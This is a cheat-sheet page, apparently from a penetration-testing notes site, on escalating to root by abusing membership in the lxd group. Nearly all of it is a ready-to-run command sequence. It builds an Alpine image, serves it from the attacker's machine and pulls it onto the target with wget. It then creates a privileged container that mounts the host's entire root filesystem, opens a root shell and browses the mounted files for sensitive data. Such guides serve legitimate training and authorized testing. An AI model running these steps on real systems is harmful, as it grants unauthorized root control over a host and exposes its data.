---
title: LXC/LXD Privilege Escalation
description: LXD is a container management extension for Linux Containers (LXC).
tags:
    - Privilege Escalation
draft: false
---

## Basic Flow

1. **Check if You are in the Lxd Group**

    If you belong to the Lxd group, you may be able to the root privileges.

    ```sh
    groups
    id
    ```

2. **Mount the Directory**

    List all images and check if a container image already exists.

    ```sh
    lxc image list
    ```

    If there are not container, build a new image in your local machine.

    ```sh
    git clone  https://github.com/saghul/lxd-alpine-builder.git
    cd lxd-alpine-builder
    sudo ./build-alpine
    python3 -m http.server
    ```

    In remote machine, download the “alpine-*.tar.gz” and import it.

    ```bash
    wget http://<local-ip>:<local-port>/alpine-v3.17-x86_64-20221206_0615.tar.gz
    lxc image import ./alpine-v3.17-x86_64-20221206_0615.tar.gz --alias <target-image-name>
    lxc image list
    ```

    After that, create a new container from the image.

    ```sh
    lxc init <target-image-name> <arbitrary-container-name> -c security.privileged=true
    ```

    Mount the host's **/** directory onto **/mnt/root** in the container you created.

    ```sh
    lxc config device add <created-container-name> <arbitrary-device-name> disk source=/ path=/mnt/root recursive=true
    ```

3. **Start the Container**

    ```sh
    lxc start <created-container-name>
    ```

4. **Get a Shell**

    ```sh
    lxc exec <created-container-name> /bin/sh
    ```

    Check if you are root.

    ```sh
    whoami
    ```

5. **Retrieve the Sensitive Information in the Mounted Directory**

    ```sh
    cd /mnt/root/
    ```